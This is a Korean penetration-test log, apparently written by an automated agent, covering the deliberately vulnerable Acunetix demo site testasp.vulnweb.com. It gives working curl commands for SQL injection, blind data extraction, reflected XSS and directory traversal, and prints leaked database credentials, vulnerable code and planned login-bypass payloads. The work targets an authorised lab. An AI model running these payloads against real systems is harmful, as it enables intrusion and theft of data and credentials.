- L3/L4: `ping 44.228.249.3` → 3 packets transmitted, **0 received, 100% packet loss**.
  TCP 22/80/443/8080/8443 → **전부 closed/filtered**.
- mitmproxy(127.0.0.1:8080, CA 신뢰 설정) 경유도 동일하게 타임아웃.
  **대조군은 정상**: 같은 프록시 경유로 `testasp.vulnweb.com` → **200 (0.37s)** —
  캡처 파이프라인·프록시 설정·CA 신뢰는 모두 정상 동작함을 확인.
- 제 3자 vantage point **3곳 모두 실패**: r.jina.ai → `TimeoutError: page.goto: Timeout
  15000ms exceeded` (422), api.codetabs.com → `error code: 522`, api.allorigins.win → `522`,

  `testphp.vulnweb.com`, `testhtml5.vulnweb.com`, `www.vulnweb.com` → 전부 타임아웃.

**2. 사용 코드**

```bash
P="-x http://127.0.0.1:8080 --cacert /home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"
B="http://testasp.vulnweb.com"

# 페이지 인벤토리 + 헤더/쿠키
for p in "/Default.asp" "/Search.asp" "/Login.asp" "/Register.asp" \
         "/Templatize.asp?item=html/about.html" "/showforum.asp?id=0" \
         "/showthread.asp?id=0" "/showthread.asp?id=1"; do
  fn=$(echo "$p" | tr -c 'A-Za-z0-9' '_')
  curl -s $P -m 20 -D "/tmp/recon/$fn.hdr" -o "/tmp/recon/$fn.body" \
       -w "%{http_code} %{size_download}\n" "$B$p"
done

# 포럼/스레드 전수
for u in "/showforum.asp?id=1" "/showforum.asp?id=2" \
         "/showthread.asp?id=2" "/showthread.asp?id=3" "/showthread.asp?id=4"; do
  curl -s $P -m 15 -o "/tmp/recon/$(echo $u|tr -c 'A-Za-z0-9' '_').body" \
       -w "%{http_code}\n" "$B$u"
done

# 관심 경로 상태코드
for u in "/Templates/MainTemplate.dwt.asp" "/Templates/" "/Images/" "/styles.css" \
         "/web.config" "/global.asa" "/Default.asp.bak" "/admin.asp" "/admin/" \
         "/_vti_bin/" "/Login.asp?RetURL=http%3A%2F%2Fexample.com" "/default.asp?x=1"; do
  curl -s $P -m 15 -o /dev/null -w "$u -> %{http_code} %{size_download}\n" "$B$u"
done

# 폼/파라미터 추출
python3 /tmp/recon/parse.py     # 정규식으로 form/input/href/asp-url 파싱

# 정상 검색어 반사 확인
curl -s $P -m 15 "$B/Search.asp?tfSearch=weather"     # → "You searched for 'weather'"

# 브라우저 기반 정찰 시도(browser toolset)
# new_tab("http://testasp.vulnweb.com/Default.asp") → wait_for_load() → js(document.title) …
```

**3. 결과**

  (classic ASP `Session.SessionID`), `.asp` 확장자, Dreamweaver 템플릿 주석
  `<!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" -->`.

  `/Login.asp`, `/Register.asp`, `/Templatize.asp?item=html/about.html`, `/styles.css`,
  `/Templates/MainTemplate.dwt.asp`.

  `Register.asp`(POST `tfUName`,`tfRName`,`tfEmail`,`tfUPass`, GET `RetURL`) /

**5. 다음 수정 방향**

exploit 라운드로 전환해 아래 순서로 시도한다(전부 비인증으로 가능한 것부터):
1. `/showforum.asp?id=` · `/showthread.asp?id=` — 정수 파라미터에 `'` 투입해 error-based

2. `/Search.asp?tfSearch=` — SQLi + reflected XSS 동시 검증.
3. `/Templatize.asp?item=` — directory traversal(`../../` 변형, URL 인코딩/이중 인코딩)로

4. `/Login.asp` — `tfUName` SQLi 인증 우회(`' OR '1'='1` 계열), `RetURL` open redirect.
5. 답글 stored XSS 는 **테스트 계정이 필요** → 사용자에게 Mattermost로 발급 요청
   (사이트가 매일 초기화되므로 계정도 매 phase 재발급 가능성 있음). 계정 없이는 이 항목 진행 불가.

주의: 이 사이트는 운영자가 의도적으로 취약하게 만든 공개 테스트 사이트이고 자동화가 명시
허용되어 있어 스코프 위반 없음. 다만 게시글 작성은 콘텐츠를 남기므로(매일 초기화되지만)
상태변경성 요청에 해당 — 계정 확보 후에도 다른 실사용자에게 영향을 줄 수 있는 대량 쓰기는

경로다(ROI: 요청 1개로 참/거짓 오라클 확보). 오라클 판정 기준은 사전 관찰로 확정했다:
**행이 나오면 200, 0행/SQL 오류면 IIS 500**(`id=-1` → 500, `id=1` → 200). 에러 본문은
IIS 기본 500 페이지(1208B)라 SQL 세부정보 노출은 없음 → error-based 가 아니라
**boolean-blind** 로 진행.

**2. 사용 코드**

전체 스크립트는 `journal/web/testphp-vulnweb-test/scripts/` 에 보존했다(phase 넘어가도 영속):
`probe_sqli.py`(1차 페이로드 매트릭스), `probe_fingerprint.py`(DBMS 지문 + UNION 컬럼 탐색),
`probe_union2.py`(UNION 재탐색), `blind_extract.py`(블라인드 추출기), 그리고 각 실행 출력
`round3_*.txt`.

핵심만:

```bash
P="-x http://127.0.0.1:8080 --cacert /home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"
B="http://testasp.vulnweb.com"

# 1) 오라클/취약점 확인 (showforum.asp)
curl -s $P -o /dev/null -w "%{http_code}\n" "$B/showforum.asp?id=1"                  # 200 (기준)
curl -s $P -o /dev/null -w "%{http_code}\n" "$B/showforum.asp?id=1%27"              # 500 ← 따옴표 탈출 시도
curl -s $P -o /dev/null -w "%{http_code}\n" "$B/showforum.asp?id=1%20AND%201=1"      # 200 ← 참
curl -s $P -o /dev/null -w "%{http_code}\n" "$B/showforum.asp?id=1%20AND%201=2"      # 500 ← 거짓
curl -s $P -o /dev/null -w "%{http_code}\n" "$B/showforum.asp?id=0%20OR%201=1"       # 200 (+883B, 전체 행)

# 2) showthread.asp — 같은 패턴, OR 1=1 이면 전 게시글 덤프
curl -s $P -m 30 -o /tmp/exploit/dump_or1.body "$B/showthread.asp?id=0%20OR%201=1"   # 2,644,469 B

# 3) Search.asp — 따옴표 + 주석
curl -s $P -o /dev/null -w "%{http_code}\n" "$B/Search.asp?tfSearch=a%27--"          # 500
curl -s $P -o /dev/null -w "%{http_code}\n" "$B/Search.asp?tfSearch=0%20OR%201=1"    # 200 (+790B)

# 4) DBMS 지문 (MSSQL vs MySQL)
curl -s $P -o /dev/null -w "%{http_code}\n" "$B/showforum.asp?id=1%20AND%20LEN(%27a%27)=1"      # 200 → MSSQL
curl -s $P -o /dev/null -w "%{http_code}\n" "$B/showforum.asp?id=1%20AND%20LENGTH(%27a%27)=1"   # 500 → MySQL 아님
curl -s $P -o /dev/null -w "%{http_code}\n" "$B/showforum.asp?id=1%20AND%20ISNULL(NULL,%27x%27)=%27x%27"  # 200 → MSSQL

# 5) 블라인드 추출기(오라클=200/500, 문자는 ASCII 이분탐색)
python3 /tmp/exploit/blind_extract.py   # 오라클: 1 AND <cond>  → 200=참 / 500=거짓
#   길이:   1 AND LEN((<expr>))=N
#   문자:   1 AND ASCII(SUBSTRING((<expr>),i,1))>M   (32..126 이분탐색)

# 대조: reflected XSS 확인
curl -s $P "$B/Search.asp?tfSearch=%3Cscript%3Ealert(1)%3C/script%3E" | grep "searched for"
```

**3. 결과**

SQLi 확정 — **3개 벡터 전부**:

| 벡터 | 근거 | 판정 |
|---|---|---|
| `/showforum.asp?id=` | `1`→200 / `1'`→500 / `1 AND 1=1`→200(+40B) / `1 AND 1=2`→500 / `0 OR 1=1`→200(+883B) | **SQLi (boolean-blind)** |
| `/showthread.asp?id=` | 동일 패턴 + `0 OR 1=1` → **2,644,469 B** 응답(게시글 1378건 전량: `posted by admin` 6879회, `ArthurGor` 1376회) | **SQLi + 대량 데이터 유출** |
| `/Search.asp?tfSearch=` | `a'--`→500 / `0 OR 1=1`→200(+790B, 전체 결과) | **SQLi** |

- **DBMS = Microsoft SQL Server** 확정(3신호): `LEN()` 동작 200 / `LENGTH()` 500 /
  `ISNULL(NULL,'x')='x'` 200 / `CONVERT(int,@@version)` 500(형변환 오류).
- **UNION-based 는 차단**: `id=0 UNION [ALL] SELECT 1..15 [--|/*]` 를 3개 벡터 전부에서
  시도했으나 전부 500(컬럼 수 15까지 스캔). 원 쿼리 구조상 UNION 결합이 불가한 것으로 판단 →
  **블라인드 추출로 우회**.
- **블라인드 추출 성공(요청 439회, 오라클 정확도 100%)**:
  - `DB_NAME()` = **`acuforum`**
  - 사용자 테이블 목록 = **`forums, posts, threads, users`**
  - `SYSTEM_USER` = **`acunetix`** (DB 접속 계정)
  - `SELECT COUNT(*) FROM users` = **`1758`**
  - `@@version` 만 추출 실패(길이 판별이 계속 거짓 — 문자열 60자 초과 추정, 상한 미조정)
  - 호출 코드: `1 AND LEN((DB_NAME()))=8`, `1 AND ASCII(SUBSTRING((DB_NAME()),1,1))>96` …
- **Reflected XSS 확정** (`/Search.asp?tfSearch=`):
  요청 `?tfSearch=<script>alert(1)</script>` → 응답 본문
  `<div class='path'>You searched for '<script>alert(1)</script>'</div>` —
  **HTML 이스케이프 없이 그대로 반사**(raw `<script>`). `"` `>` 조합도 그대로 반사되어
  attribute 탈출형 페이로드도 가능.
- 부수 관찰: `id` 파라미터가 페이지 내 `Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1` 링크에
  URL 인코딩된 형태로 반사된다(이 경로 자체는 XSS 아님 — 인코딩됨).

**4. 피드백**

성공. 비인증 SQLi 3벡터 + reflected XSS 1건 확보. 특히 블라인드 추출로 **DB명·테이블
목록·접속 계정·행 수까지 실제로 빼냈으므로** "이론적 취약점"이 아니라 재현 가능한 임팩트다.
UNION 이 막혀도 boolean-blind 로 우회된다는 것까지 확인해서, 이후 어떤 데이터든(예: users
테이블 자격증명) 같은 방식으로 추출 가능하다는 게 증명됐다. 에러 페이지가 IIS 기본 500이라
에러 기반 추출은 불가하지만 손실 없음.

**5. 다음 수정 방향**

1. **users 테이블 자격증명 추출** — 컬럼명을 `information_schema.columns` 로 블라인드 추출한
   뒤 `SELECT TOP 1 username/password FROM users` 를 같은 이분탐색으로 뽑는다(계정 1758개
   중 1~2건만 뽑아 임팩트 증명 — 대량 덤프는 하지 않음).
2. `/Templatize.asp?item=` directory traversal — `../`, `..%2f`, `%2e%2e%2f`, `..\`, 유니코드/
   이중 인코딩 변형으로 `web.config`/`global.asa`/상위 디렉토리 파일 접근. 성공 시 소스·설정
   유출 → 심각도 상승.
3. `/Login.asp` — `tfUName=' OR '1'='1` 계열 인증 우회, 그리고 `RetURL` open redirect
   (로그인 없이는 리다이렉트가 안 일어날 수 있어, 우회 성공과 체이닝하면 확인 가능).
4. 답글 stored XSS 는 여전히 **테스트 계정 필요** — 사용자에게 요청 상태 유지.

즉 `item` 은 **응용 루트 기준 상대경로**로 풀리고, 파일이 실제로 존재하면 읽히고 없으면 500 이다.
그렇다면 같은 루트에 있는 **`.asp` 파일은 실행되지 않고 include 되므로 "소스 그대로" 읽힐 것**이라는
가설이 섰다(`Templatize.asp` 는 자기가 실행되지 않고 템플릿에 포함된다). 소스가 읽히면 DB 연결
문자열·정확한 쿼리 문자열이 모두 노출되어 이후 모든 공격(PoC 정확도)이 즉시 올라가므로 ROI 최상.

**2. 사용 코드**

`scripts/probe_srcleak.py` (소스 후보 파일 목록 → inner 영역 추출 → 민감 패턴 grep).
응답 원문은 `evidence/source_leak/*.txt` 에 보존.

```bash
src="$J/evidence/source_leak"
# 루트 기준 상대경로로 .asp 소스 읽기 (실행이 아니라 include 되므로 소스가 나온다)
for f in db.asp logInput.asp Login.asp showforum.asp showthread.asp Search.asp \
         Templatize.asp Register.asp Logout.asp Default.asp web.config; do
  curl -s $P -m 25 "http://testasp.vulnweb.com/Templatize.asp?item=$f" -o "$src/$f.txt"

grep -n "conn.Open" "$src/db.asp.txt"
grep -n -i -E "sql|LIKE|CHARINDEX|rs\.Open" "$src/Search.asp.txt"
```

**3. 결과**

**(a) ASP 소스 전체 유출 — 확정.** 루트 기준 상대경로로 11개 파일이 그대로 읽혔다
(모두 200 + 평문 소스): `db.asp`, `logInput.asp`, `Login.asp`, `showforum.asp`, `showthread.asp`,
`Search.asp`, `Templatize.asp`, `Register.asp`, `Logout.asp`, `Default.asp`, `web.config`.

**(b) DB 자격증명 노출 — 확정(치명적).** `evidence/source_leak/db.asp.txt:31`:

```vbscript
Function GetConnection()
  dim conn
  set conn = Server.CreateObject("ADODB.Connection")
  conn.Open "Provider=SQLNCLI11;Server=(local)\SQL;Database=acuforum;Uid=acunetix;Pwd=acunetixtrustno1;"
  set GetConnection = conn
End Function
```
→ DBMS=MSSQL(SQLNCLI11), 서버 `(local)\SQL`, DB `acuforum`, **계정 `acunetix` / 비밀번호
`acunetixtrustno1`** 가 소스에 하드코딩. (Round 3 에서 블라인드 추출로 알아낸 `SYSTEM_USER='acunetix'`
와 정확히 일치 — 두 경로가 서로 교차검증됨.)

**(c) 취약점 근거(소스) — 정확한 원인 확정**

| 파일 | 취약 코드 |
|---|---|
| `Login.asp:8` | `sql = "SELECT uname, upass FROM users WHERE uname='" & Request.Form("tfUName") & "' AND upass='" & Request.Form("tfUPass") & "'"` → 따옴표 안 직접 연결(인증 우회), 그리고 `Session.Contents("uname") = Request.Form("tfUName")` 로 **검증 없이 입력값을 세션 사용자명으로 저장**(= "logout admin'--" 표시의 원인) |
| `showforum.asp:9` | `rs.Open "SELECT name, descr FROM forums WHERE id=" & Request.QueryString("id"), conn` → 숫자 위치 무따옴표 연결 |
| `showthread.asp:9` | `... FROM forums a, threads b WHERE a.id = b.forumid AND b.id=" & Request.QueryString("id")` → 동일 |
| `Search.asp:78` | `... CHARINDEX(a.title, '"&st&"')>0 OR CHARINDEX(a.message,'"&st&"')>0` → 검색어 직접 연결(SQLi) + 같은 값이 HTML 로 반사(XSS) |
| `showforum.asp:17`/`showthread.asp:16` | 게시글 필터가 `If InStr(1, …, "<a href=") > 0 then Response.End` — **`<a href=` 문자열 하나만 차단**. `<script>`·`<img onerror>`·`<svg onload>` 는 무필터 통과 → stored XSS 성립 조건 확인(소스 근거) |
| `db.asp` | 연결 문자열 하드코딩(위 b) |
| `logInput.asp` | `WriteToFile(FileName, Contents, Append)` + `Scripting.FileSystemObject` — 요청 로그를 `C:\scripts\logInput.txt` 에 append 하도록 작성돼 있음(현재 호출부는 주석 처리). 파일 쓰기 프리미티브가 앱에 존재 |

**(d) 중요 안전 관찰(위험한 코드 경로 발견).** `showforum.asp`/`showthread.asp` 의 게시 처리 코드에
`if rs.fields.item("total")>100 then … DELETE FROM threads WHERE forumid=<id> … DELETE FROM posts
WHERE forumid=<id>` 가 있다. 즉 **로그인 + POST + 주입된 `id` 를 조합하면 해당 포럼의 스레드/게시글이
일괄 삭제**될 수 있다. 이후 라운드에서 POST 기반 페이로드를 쓸 때 이 경로를 절대 건드리지 않는다
(GET 기반 읽기 전용 검증만 유지).

**4. 피드백**

매우 성공. traversal 하나가 **임의 파일 읽기 → 소스 유출 → DB 자격증명 탈취**로 확장됐고,
SQLi·XSS 의 원인 코드가 전부 확보되어 PoC 재현성이 크게 올라갔다. stored XSS 는 이제 "될 것 같다"가
아니라 **차단 필터가 `<a href=` 하나뿐이라는 소스 근거**까지 확보한 상태다(실제 쓰기 검증만 남음 —
공개 포럼에 콘텐츠를 남기는 상태변경이라 사전 승인 필요). 부수적으로 앱에 파일 쓰기 프리미티브가
있다는 것도 확인했다(웹셸 업로드 경로가 아니라 로그 append 용도지만, 파일 쓰기 surface 로 기록).

**5. 다음 수정 방향**

1. **stored XSS 실증** — 우회 세션으로 답글 1건에 `<script>` 또는 `<img onerror>` 페이로드 삽입,
   스레드 재방문으로 실행 조건 확인. **공개 포럼 상태변경이므로 사용자 사전 승인 후 1회만.**
   (게시글이 쌓이면 앱 자체 로직에 의해 100건 초과 시 자동 삭제되므로 최소 흔적.)
2. traversal 로 더 읽을 만한 파일: `C:\scripts\logInput.txt`(있으면 과거 요청 로그),
   응용 프로그램 백업(`Default.asp.bak` 등 — 루트 기준으로 재시도), `Templates/` 하위 전체.
3. `/Register.asp` 폼 검증(중복 사용자명/이메일 XSS) — 소스 확보했으므로 근거 기반으로 검증.
4. DB 자격증명 확보 → SQLi 를 더 이상 블라인드로 할 필요 없음(쿼리 원문을 알게 됐으므로 UNION 형태
   제약도 소스에서 설명 가능: `WHERE id=<n>` 뒤에 아무것도 없어 UNION 이 가능해야 하는데 500 —
   `rs.Open` + `SELECT name, descr` 2컬럼이므로 `id=0 UNION SELECT 1,2--` 가 맞을 텐데도 500 인 건
   SQLNCLI11+Recordset 의 특성일 수 있음 → 다음 라운드에 2컬럼 정확히 지정해 재시도 가치 있음).
